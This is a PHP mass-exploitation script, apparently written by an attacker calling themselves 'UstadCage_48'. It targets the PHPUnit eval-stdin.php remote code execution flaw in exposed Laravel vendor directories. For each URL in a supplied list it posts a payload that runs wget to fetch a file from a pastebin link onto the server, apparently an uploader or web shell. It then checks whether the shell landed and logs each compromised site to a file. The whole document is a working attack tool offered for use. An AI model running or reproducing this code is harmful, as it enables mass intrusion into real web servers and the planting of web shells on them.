<?php
// coded by UstadCage_48
// PHPlaravel RCE
// Bacot sia mah ah

error_reporting(0);
echo "  ─────────────────────────
  ╔╗─╔═╗─╔╦╗╔═╗─╔═╦═╗╔═╗╔╗─
  ║╚╗║╬╚╗║╔╝║╬╚╗╚╗║╔╝║╩╣║╚╗
  ╚═╝╚══╝╚╝─╚══╝─╚═╝─╚═╝╚═╝\n\n";
$site = $argv[1];
$by = '♥ LusianaQ<?php system("wget https://pastebin.com/raw/vKfyPDA3 -O eval-tad.php"); ?>';
$byy = fopen('tad.txt', 'w');
fwrite($byy,$by);
fclose($byy);
$up = '@tad.txt';
$path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
function sv($site,$ext){
$fp = fopen("$ext.txt", 'a');
fwrite($fp, "$site\n");
fclose($fp);
}
$kuning = "\033[93m";
$ungu = "\033[95m";
$biru = "\033[94m";
$merah = "\033[91m";
$hijau = "\033[92m";
$lusi = explode("\n",file_get_contents($site));
   foreach($lusi as $url){
   	  echo "$ungu [$] $kuning $url\n";
   	$jj = shell_exec("curl -sk -d ''".$up."'' ".$url.$path."");
   	if(preg_match('/LusianaQ/',$jj)){
   		echo "$ungu [$] $hijau Exploit Succesfuly...\n";
   		echo "$ungu [$] $kuning Checking Uploader...\n";
$parse = parse_url($url.$path);
$pattern = '~\w+\.php~';
$parse = preg_replace($pattern, '', $parse);
$site = $parse['scheme'].'://'.$parse['host'].$parse['path'];
   		if(preg_match('/USTADCAGE_48/',file_get_contents($site."tad.php"))){
   			echo "$ungu [$] $hijau Uploader Successfuly Created ! \n\n";
   			sv($site."tad.php","xhell");
   		} else {
   			echo "$ungu [$] $merah Uploader Failed Created \n\n";
   		}
   	} else {
   		echo "$ungu [$] $merah Exploit Failed !! \n\n";
   	}
}
